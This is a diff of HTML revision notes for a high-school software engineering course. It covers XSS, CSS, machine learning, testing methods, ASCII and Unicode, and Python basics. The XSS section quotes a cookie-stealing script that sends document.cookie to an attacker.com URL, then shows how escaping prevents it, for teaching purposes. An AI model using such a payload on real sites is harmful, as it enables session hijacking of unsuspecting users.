+          <p>XSS is a web security vulnerability where an attacker injects malicious client-side scripts into web pages that other users then view. The injected script runs in the victim's browser with the same trust level as the legitimate site.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">XSS — Attack example</span></div>
+            <pre><code>&lt;!-- Attacker submits this as a comment/username: --&gt;
+&lt;script&gt;
+  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
+&lt;/script&gt;
+
+&lt;!-- If the server renders it without escaping, every visitor runs the script --&gt;</code></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">XSS Prevention — Escape output</span></div>
+            <pre><code># Python (Flask) — escape user input before rendering
+from markupsafe import escape
+
+username = request.form['username']
+safe_name = escape(username)   # &lt;script&gt; becomes &amp;lt;script&amp;gt;
+return f"&lt;p&gt;Hello, {safe_name}&lt;/p&gt;"</code></pre>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Escaping output</strong><span>Convert special characters (<code>&lt; &gt; &amp; " '</code>) to their HTML entities before rendering.</span></div>
+            <div class="key-term-item"><strong>Input validation</strong><span>Reject or sanitise input that doesn't match expected formats on the server side.</span></div>
+            <div class="key-term-item"><strong>Content Security Policy</strong><span>A browser header that restricts which scripts are allowed to execute on a page.</span></div>
+          </div>
 
           <h3>Cascading Style Sheets (CSS)</h3>
-          <p>A stylesheet language used to describe the presentation of HTML documents. CSS rules use a selector, property, and value syntax.</p>
+          <p>CSS describes the visual presentation of HTML documents — colours, layout, fonts, and spacing. Styles <em>cascade</em>: more specific rules override more general ones.</p>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">CSS Syntax</span></div>
-            <pre><code>selector {
-  property: value;
+            <div class="code-header"><span class="code-lang">CSS — Syntax and Examples</span></div>
+            <pre><code>/* Syntax: selector { property: value; } */
+
+/* Element selector — targets all &lt;p&gt; tags */
+p {
+  font-size: 16px;
+  color: #333333;
+  line-height: 1.6;
+}
+
+/* Class selector — targets elements with class="highlight" */
+.highlight {
+  background-color: yellow;
+  font-weight: bold;
+}
+
+/* ID selector — targets the unique element with id="header" */
+#header {
+  background-color: #2c3e50;
+  padding: 20px;
+  text-align: center;
+}
+
+/* Descendant selector — targets &lt;a&gt; inside .nav */
+.nav a {
+  color: white;
+  text-decoration: none;
 }</code></pre>
           </div>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Selector</strong><span>Targets the HTML element(s) to style (e.g. <code>p</code>, <code>.class</code>, <code>#id</code>).</span></div>
-            <div class="key-term-item"><strong>Property</strong><span>The style attribute to change (e.g. <code>color</code>, <code>font-size</code>, <code>margin</code>).</span></div>
-            <div class="key-term-item"><strong>Value</strong><span>The setting to apply to the property (e.g. <code>red</code>, <code>16px</code>, <code>auto</code>).</span></div>
+            <div class="key-term-item"><strong>Selector</strong><span>Targets which element(s) to style: element (<code>p</code>), class (<code>.name</code>), ID (<code>#name</code>), or descendant (<code>div p</code>).</span></div>
+            <div class="key-term-item"><strong>Property</strong><span>The visual attribute to change: <code>color</code>, <code>font-size</code>, <code>margin</code>, <code>padding</code>, <code>display</code>.</span></div>
+            <div class="key-term-item"><strong>Value</strong><span>The setting for that property: <code>red</code>, <code>16px</code>, <code>1em</code>, <code>auto</code>, <code>#ff0000</code>.</span></div>
+            <div class="key-term-item"><strong>Specificity</strong><span>More specific selectors win: ID > class > element. Inline styles override all.</span></div>
           </div>
         </section>
 
@@ -389,38 +691,48 @@ ORDER BY field(s) ASC/DESC</code></pre>
         <!-- 10. Machine Learning -->
         <section id="machine-learning">
           <h2 class="syllabus-phase">🤖 Machine Learning</h2>
+          <p>Machine learning (ML) enables systems to learn patterns from data and make predictions or decisions without being explicitly programmed for each case.</p>
 
-          <h3>Machine learning automation through DevOps</h3>
-          <p>The integration of machine learning workflows with DevOps practices (MLOps). The three stages:</p>
-          <ol>
-            <li><strong>Design</strong>: Problem definition, metrics, data research.</li>
-            <li><strong>Model Development</strong>: Wrangling, engineering, training, validation.</li>
-            <li><strong>Operations</strong>: Deployment, monitoring, performance.</li>
-          </ol>
+          <h3>Machine learning automation through DevOps (MLOps)</h3>
+          <p>MLOps integrates ML workflows with software engineering and DevOps practices to make model development and deployment reliable and repeatable. Three stages:</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>1. Design</strong><span>Define the problem, choose success metrics, and research available data sources. Determine whether ML is the right solution.</span></div>
+            <div class="key-term-item"><strong>2. Model Development</strong><span>Collect and clean data (wrangling), select features (feature engineering), train the model, then validate and tune it.</span></div>
+            <div class="key-term-item"><strong>3. Operations</strong><span>Deploy the trained model to production, monitor its real-world performance, and retrain when the model degrades over time.</span></div>
+          </div>
 
           <h3>Regression algorithms</h3>
-          <p>Supervised learning algorithms used to predict a continuous output value based on input features.</p>
+          <p>Supervised learning algorithms that predict a <strong>continuous numerical output</strong> from input features. The algorithm learns the mapping between inputs and outputs from labelled training data.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Linear Regression</strong><span>Models the relationship between variables using a straight line: <code>y = mx + b</code>.</span></div>
-            <div class="key-term-item"><strong>Logistic Regression</strong><span>Used for classification tasks; outputs a probability between 0 and 1.</span></div>
-            <div class="key-term-item"><strong>Polynomial Regression</strong><span>Extends linear regression to model curved (non-linear) relationships.</span></div>
+            <div class="key-term-item"><strong>Linear Regression</strong><span>Fits a straight line to the data: <code>y = mx + b</code>. Example: predicting a student's final exam score from hours studied.</span></div>
+            <div class="key-term-item"><strong>Multiple Linear Regression</strong><span>Extends to multiple input features: <code>y = m₁x₁ + m₂x₂ + … + b</code>. Example: predicting house price from size, location, and age.</span></div>
+            <div class="key-term-item"><strong>Logistic Regression</strong><span>Despite the name, used for <em>classification</em> — outputs a probability between 0 and 1. Example: spam or not spam.</span></div>
+            <div class="key-term-item"><strong>Polynomial Regression</strong><span>Fits a curved line by adding powers of features (x², x³, …). Used when data has a non-linear relationship.</span></div>
           </div>
 
           <h3>Neural Networks</h3>
-          <p>Computational models inspired by biological neural networks, composed of layers of interconnected nodes (neurons).</p>
-
-          <h4>Training cycle</h4>
+          <p>Computational models loosely inspired by the brain, composed of <strong>layers of interconnected nodes (neurons)</strong>. Each connection has a weight that is adjusted during training.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Forward pass</strong><span>Input data is passed through the network to generate a prediction.</span></div>
-            <div class="key-term-item"><strong>Loss calculation</strong><span>The error between the prediction and the expected output is measured.</span></div>
-            <div class="key-term-item"><strong>Backpropagation</strong><span>The error is propagated backwards through the network to update weights.</span></div>
-            <div class="key-term-item"><strong>Weight update</strong><span>Weights are adjusted using an optimiser (e.g. gradient descent) to reduce loss.</span></div>
+            <div class="key-term-item"><strong>Input layer</strong><span>Receives the raw input features (e.g. pixel values of an image, or sensor readings).</span></div>
+            <div class="key-term-item"><strong>Hidden layer(s)</strong><span>One or more intermediate layers that learn to detect patterns and features. "Deep" networks have many hidden layers.</span></div>
+            <div class="key-term-item"><strong>Output layer</strong><span>Produces the final prediction — e.g. a class label, a probability, or a continuous value.</span></div>
+            <div class="key-term-item"><strong>Weights &amp; biases</strong><span>Numerical parameters on each connection; adjusted during training to minimise prediction error.</span></div>
+            <div class="key-term-item"><strong>Activation function</strong><span>Introduces non-linearity at each neuron (e.g. ReLU, Sigmoid) so the network can model complex patterns.</span></div>
           </div>
 
-          <h4>Execution cycle</h4>
+          <h4>Training cycle</h4>
+          <p>Repeated many times (each complete pass through training data is called an <em>epoch</em>) until the model's error is minimised.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>Inference</strong><span>The trained model receives new input and generates a prediction (forward pass only).</span></div>
-            <div class="key-term-item"><strong>Deployment</strong><span>The model is integrated into an application or service for real-world use.</span></div>
+            <div class="key-term-item"><strong>1. Forward pass</strong><span>Input data flows through the network layer by layer to produce a prediction.</span></div>
+            <div class="key-term-item"><strong>2. Loss calculation</strong><span>A loss function (e.g. mean squared error) measures how far the prediction is from the expected output.</span></div>
+            <div class="key-term-item"><strong>3. Backpropagation</strong><span>The loss gradient is computed and propagated backwards through the network to find each weight's contribution to the error.</span></div>
+            <div class="key-term-item"><strong>4. Weight update</strong><span>An optimiser (e.g. gradient descent) nudges weights in the direction that reduces the loss.</span></div>
+          </div>
+
+          <h4>Execution cycle (Inference)</h4>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Inference</strong><span>The trained model receives new, unseen input and performs a forward pass to generate a prediction. No weight updates occur.</span></div>
+            <div class="key-term-item"><strong>Deployment</strong><span>The model is packaged and integrated into an application or API so end users can benefit from its predictions in real time.</span></div>
           </div>
         </section>
 
@@ -429,13 +741,29 @@ ORDER BY field(s) ASC/DESC</code></pre>
         <!-- 11. Methods for Testing a System -->
         <section id="testing-methods">
           <h2 class="syllabus-phase">🧪 Methods for Testing a System</h2>
+          <p>Testing verifies that a system behaves correctly and meets its requirements. Different testing methods serve different purposes at different stages of development.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔧 Functional</strong><span>Verifies the system operates according to its functional requirements and produces expected outputs.</span></div>
-            <div class="key-term-item"><strong>✅ Acceptance</strong><span>Determines whether the system meets stakeholder requirements and is ready for deployment.</span></div>
-            <div class="key-term-item"><strong>📡 Live Data</strong><span>Tests using real-world production data to identify issues in a live environment.</span></div>
-            <div class="key-term-item"><strong>🎲 Simulated Data</strong><span>Uses artificially generated data that mirrors expected real-world scenarios.</span></div>
-            <div class="key-term-item"><strong>🧑‍💻 Beta</strong><span>Releases the product to a limited group of real users to identify bugs before full release.</span></div>
-            <div class="key-term-item"><strong>📦 Volume</strong><span>Evaluates system performance under large amounts of data to test scalability.</span></div>
+            <div class="key-term-item"><strong>🔧 Functional testing</strong><span>Verifies the system produces the correct output for a given input, according to its functional requirements. Tests specific features in isolation.</span></div>
+            <div class="key-term-item"><strong>✅ Acceptance testing</strong><span>Conducted with stakeholders to confirm the system meets agreed requirements. The final check before deployment.</span></div>
+            <div class="key-term-item"><strong>📡 Live data testing</strong><span>Tests using real-world production data in a staging environment, revealing issues that only emerge with authentic data patterns.</span></div>
+            <div class="key-term-item"><strong>🎲 Simulated data testing</strong><span>Uses artificially generated data to test scenarios that may be rare or impossible to reproduce with live data (e.g. edge cases, extreme values).</span></div>
+            <div class="key-term-item"><strong>🧑‍💻 Beta testing</strong><span>Releases the product to a limited group of real users before full launch to identify usability issues and bugs in realistic conditions.</span></div>
+            <div class="key-term-item"><strong>📦 Volume testing</strong><span>Evaluates system performance under large quantities of data to identify scalability and performance bottlenecks.</span></div>
+          </div>
+
+          <h3>Test Data Categories</h3>
+          <p>When designing test cases, you should always include data from three categories:</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Category</th><th>Description</th><th>Example (age field, valid range 0–120)</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><strong>Valid / Normal</strong></td><td>Data within the expected range that should be accepted.</td><td><code>25</code>, <code>47</code>, <code>60</code></td></tr>
+                <tr><td><strong>Boundary</strong></td><td>Data at the exact edges of the valid range — often where off-by-one bugs hide.</td><td><code>0</code>, <code>1</code>, <code>119</code>, <code>120</code></td></tr>
+                <tr><td><strong>Invalid / Erroneous</strong></td><td>Data outside the valid range or of the wrong type — should be rejected with an error message.</td><td><code>-1</code>, <code>121</code>, <code>"abc"</code>, empty</td></tr>
+              </tbody>
+            </table>
           </div>
         </section>
 
@@ -444,11 +772,31 @@ ORDER BY field(s) ASC/DESC</code></pre>
         <!-- 12. Character Representation -->
         <section id="character-representation">
           <h2 class="syllabus-phase">🔣 Character Representation</h2>
-          <p>Characters are represented using <strong>ASCII</strong> or <strong>Unicode</strong>. Developers use binary internal formats for functions like case conversion or simple encryption.</p>
+          <p>Computers store text by mapping each character to a numeric code, which is then stored in binary. The encoding standard used determines which number corresponds to which character.</p>
           <div class="key-terms">
-            <div class="key-term-item"><strong>ASCII</strong><span>7-bit encoding representing 128 characters (letters, digits, symbols, control codes).</span></div>
-            <div class="key-term-item"><strong>Unicode</strong><span>International standard encoding supporting over 140,000 characters across most writing systems.</span></div>
-            <div class="key-term-item"><strong>UTF-8</strong><span>Variable-width encoding for Unicode; backwards-compatible with ASCII.</span></div>
+            <div class="key-term-item"><strong>ASCII</strong><span>American Standard Code for Information Interchange. A 7-bit encoding representing 128 characters: uppercase letters (A–Z), lowercase (a–z), digits (0–9), punctuation, and control codes.</span></div>
+            <div class="key-term-item"><strong>Unicode</strong><span>An international standard that assigns a unique code point to over 140,000 characters, covering most of the world's writing systems including emojis.</span></div>
+            <div class="key-term-item"><strong>UTF-8</strong><span>The most common Unicode encoding on the web. Uses 1–4 bytes per character. Fully backwards-compatible with ASCII (characters 0–127 use the same byte values).</span></div>
+          </div>
+
+          <h3>Character code examples</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Character</th><th>ASCII Decimal</th><th>Hexadecimal</th><th>Binary (8-bit)</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>A</code></td><td>65</td><td>0x41</td><td>0100 0001</td></tr>
+                <tr><td><code>B</code></td><td>66</td><td>0x42</td><td>0100 0010</td></tr>
+                <tr><td><code>a</code></td><td>97</td><td>0x61</td><td>0110 0001</td></tr>
+                <tr><td><code>z</code></td><td>122</td><td>0x7A</td><td>0111 1010</td></tr>
+                <tr><td><code>0</code></td><td>48</td><td>0x30</td><td>0011 0000</td></tr>
+                <tr><td><code>Space</code></td><td>32</td><td>0x20</td><td>0010 0000</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="callout info">
+            <strong>Case conversion trick:</strong> Notice that <code>'A'</code> = 65 and <code>'a'</code> = 97 — a difference of exactly 32 (0b00100000). To convert uppercase to lowercase in binary, you simply set bit 5 to 1. This is why character encoding matters to developers beyond just storing text.
           </div>
         </section>
 
@@ -457,44 +805,157 @@ ORDER BY field(s) ASC/DESC</code></pre>
         <!-- 13. Programming with Python -->
         <section id="python">
           <h2 class="syllabus-phase">🐍 Programming with Python</h2>
-          <p>Python is the primary language used in the HSC Software Engineering course. Key syntax and conventions:</p>
+          <p>Python is the primary programming language for the HSC Software Engineering course. It uses indentation (not braces) to define code blocks, and reads like English.</p>
+
+          <h3>Variables, Input &amp; Output</h3>
           <div class="code-block">
-            <div class="code-header"><span class="code-lang">Python — Core Syntax</span></div>
-            <pre><code># Variables and assignment
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Variables are dynamically typed — no need to declare a type
 name = "Alice"
 age = 17
+score = 87.5
+is_passing = True
 
-# Input / Output
-name = input("Enter name: ")
+# Getting input from the user (always returns a string)
+name = input("Enter your name: ")
+age = int(input("Enter your age: "))    # Convert to integer
+score = float(input("Enter score: "))   # Convert to float
+
+# Output
 print("Hello,", name)
+print(f"Score: {score:.1f}/100")        # f-string with 1 decimal place</code></pre>
+          </div>
 
-# Selection
-if age >= 18:
-    print("Adult")
-elif age >= 13:
-    print("Teenager")
+          <h3>Selection</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Binary selection
+if score >= 50:
+    print("Pass")
 else:
-    print("Child")
+    print("Fail")
 
-# Iteration
+# Multi-way selection (elif chain)
+if score >= 90:
+    grade = "A"
+elif score >= 75:
+    grade = "B"
+elif score >= 50:
+    grade = "C"
+else:
+    grade = "Fail"
+print(f"Grade: {grade}")</code></pre>
+          </div>
+
+          <h3>Repetition</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># for loop — counted repetition (range gives 1, 2, 3, 4, 5)
+total = 0
 for i in range(1, 6):
-    print(i)
+    score = int(input(f"Enter score {i}: "))
+    total += score
+average = total / 5
+print(f"Average: {average}")
 
-count = 0
-while count < 5:
-    count += 1
+# while loop — condition-controlled (pre-test)
+password = input("Enter password: ")
+while password != "secret123":
+    print("Incorrect. Try again.")
+    password = input("Enter password: ")
+print("Access granted.")</code></pre>
+          </div>
 
-# Functions
-def greet(name):
-    return "Hello, " + name
+          <h3>Functions</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Procedure — performs an action, no return value
+def display_result(name, score):
+    print(f"{name}: {score}/100")
+    if score >= 50:
+        print("  → Pass")
+    else:
+        print("  → Fail")
 
-# Lists
-scores = [85, 92, 78]
-scores.append(95)
+# Function — returns a computed value
+def calculate_grade(score):
+    if score >= 90:
+        return "A"
+    elif score >= 75:
+        return "B"
+    elif score >= 50:
+        return "C"
+    else:
+        return "Fail"
 
-# File I/O
-with open("data.txt", "r") as f:
-    content = f.read()</code></pre>
+# Calling them
+display_result("Alice", 87)
+grade = calculate_grade(87)
+print(f"Grade: {grade}")     # Grade: B</code></pre>
+          </div>
+
+          <h3>Lists &amp; Iteration</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code>scores = [85, 92, 78, 64, 90]
+
+# Access by index (0-based)
+print(scores[0])    # 85
+print(scores[-1])   # 90 (last element)
+
+# Common list operations
+scores.append(77)         # Add to end
+scores.sort()             # Sort ascending
+scores.sort(reverse=True) # Sort descending
+highest = max(scores)
+lowest = min(scores)
+average = sum(scores) / len(scores)
+
+# Iterate over a list
+for s in scores:
+    print(s, end=" ")    # 92 90 85 78 77 64
+
+# List comprehension — filter passing scores
+passing = [s for s in scores if s >= 50]</code></pre>
+          </div>
+
+          <h3>File I/O</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Writing to a file
+with open("scores.txt", "w") as f:
+    for score in scores:
+        f.write(str(score) + "\n")
+
+# Reading from a file
+with open("scores.txt", "r") as f:
+    for line in f:
+        value = int(line.strip())   # strip() removes trailing newline
+        print(value)
+
+# Appending to an existing file
+with open("scores.txt", "a") as f:
+    f.write("99\n")</code></pre>
+          </div>
+
+          <h3>Dictionaries</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Dictionary stores key-value pairs
+student = {
+    "name": "Alice",
+    "age": 17,
+    "score": 87.5
+}
+
+# Access and update
+print(student["name"])          # Alice
+student["score"] = 92.0         # Update value
+student["subject"] = "SoftEng" # Add new key
+
+# Iterate over key-value pairs
+for key, value in student.items():
+    print(f"{key}: {value}")</code></pre>
           </div>
         </section>
 
